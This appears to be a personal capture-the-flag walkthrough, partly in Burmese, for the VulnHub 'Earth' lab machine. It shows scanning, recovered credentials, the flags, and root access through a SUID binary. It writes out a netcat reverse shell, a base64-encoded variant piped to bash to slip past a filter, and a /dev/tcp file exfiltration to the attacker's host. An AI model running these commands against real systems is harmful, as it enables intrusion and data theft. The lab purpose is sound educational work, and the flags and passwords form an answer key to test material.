---
{"tags":["getfullshell","vulnhub","walkthrought"],"dg-publish":true,"Auther":"y3kh","permalink":"/ctf/vulnhub/earth-vulnhub/","dgPassFrontmatter":true,"noteIcon":""}
---

sudo nmap -sC -sV -oN earth 192.168.90.2                                                                                                                            
Nmap scan report for 192.168.90.2
Host is up (0.0015s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Bad Request (400)
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
```
sudo nano /etc/hosts
```
##### add this line
192.168.90.2  earth.local  terratest.earth.local
> mozilla > earth.local > sent message > encript code တစ်ခု ကျလာလိမ့်မယ်
>  ဥပမာ : 050c53070e470401097e79
```
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt 
```

	  starting gobuster in directory enumeration mode
	/admin                (Status: 301) [Size: 0] [--> /admin/]
	/cgi-bin/             (Status: 403) [Size: 199]
	Progress: 4614 / 4615 (99.98%)
	Finished

earth.local/admin
https://terratest.earth.local/
> try view page source nothing found
```
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt
```
*https ဖြစ်လို့ -k သုံးရတယ်*
/index.html           (Status: 200) [Size: 26]
/robots.txt            (Status: 200) [Size: 26]

>mozilla
>https://terratest.earth.local/testingnotes.txt
>https://terratest.earth.local/testdata.txt
>earth.localhost
*cyberchief use*
![earth-cyberchief.png|400](/img/user/Images%20All/earth-cyberchief.png)

user : terra
pass : earthclimatechangebad4humans
*run command*
whoami
ls /var/earth_web 
cat /var/earth_web/user_flag.txt
**flag : [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] 

---
### rever shell simple method 
```
host machine  nc -lvnp 4444
target machine မှာ
nc -e /bin/bash 192.168.200.5 4444
**it will not woking coz 
Remote connections are forbidden
use encode version
reverse shell online base 64 change ပါ မယ် 
echo 'nc -e /bin/bash 192.168.200.5 4444' | base64
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjAwLjcgNDQ0NAo
target machine မှာ ပြန်ပြီး ဒီဟာကို ရိုက်မယ်
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjAwLjcgNDQ0NAo' | base64 -d  | bash


```


```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
### privilege Escalation

find / -perm -u=s 2>/dev/null
file /usr/bin/reset_root
nc -lvnp 3333 > reset_root
cat /usr/bin/reset_root > /dev/tcp/192.168.200.5/3333
apt install ltrace 
ltrace ./reset_root
touch kHgTFI5G
touch Zw7bV9U5
touch kcM0Wewe
reset_root
su root
password : Earth
flag : root_flag_b0da9554d29db2117b02aa8b66ec492e




<iframe width="1280" height="720" src="https://www.youtube.com/embed/e9de7AK0i2s?si=A1mMNAb9oeidOksa" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
